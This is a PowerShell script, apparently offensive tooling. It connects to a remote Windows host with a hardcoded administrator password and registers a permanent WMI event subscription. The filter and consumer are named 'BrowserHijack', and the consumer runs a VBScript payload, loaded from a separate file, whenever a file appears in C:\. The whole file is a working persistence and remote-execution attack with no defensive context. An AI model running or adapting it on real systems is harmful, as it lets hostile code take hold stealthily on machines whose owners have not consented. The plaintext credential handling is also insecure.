$Secpasswd = ConvertTo-SecureString "P@ssw0rd!" -AsPlainText -Force
$Creds = New-Object System.Management.Automation.PSCredential ("wmiserver\administrator", $secpasswd)
$CimSession = New-CimSession -ComputerName 10.0.75.2 -Credential $Creds

#$sOpt = New-CimSessionOption ¨CProtocol DCOM
#$CimSession = New-CimSession ¨CComputerName 10.0.75.2 ¨CSessionOption $sOpt  -Credential $Creds


$query = @"
 Select * from __InstanceCreationEvent within 30

 where targetInstance isa 'Cim_DirectoryContainsFile'

 and targetInstance.GroupComponent = 'Win32_Directory.Name="C:\\\\"'
"@

$filterParam = @{
    QueryLanguage = "WQL"
    Query = $query
    Name = "BrowserHijackFilter"
    EventNameSpace = "root/CIMV2"
}
$filter = New-CimInstance -ClassName __EventFilter -Namespace root/subscription -CimSession $CimSession -Property $filterParam

$vbs = Get-Content BrowserHijackVBS.vbs | Out-String
 $consumerParam = @{
    Name = "BrowserHijackConsumer"
    ScriptText = $vbs
    ScriptingEngine="VBScript"
 }

 $consumer = New-CimInstance -ClassName ActiveScriptEventConsumer -Namespace root/subscription -CimSession $CimSession -Property $consumerParam


 $bindingParam = @{
    Filter = [ref]$filter
    Consumer = [ref]$consumer
 }

 New-CimInstance -ClassName __FilterToConsumerBinding -Namespace root/subscription -CimSession $CimSession -Property $bindingParam | out-null

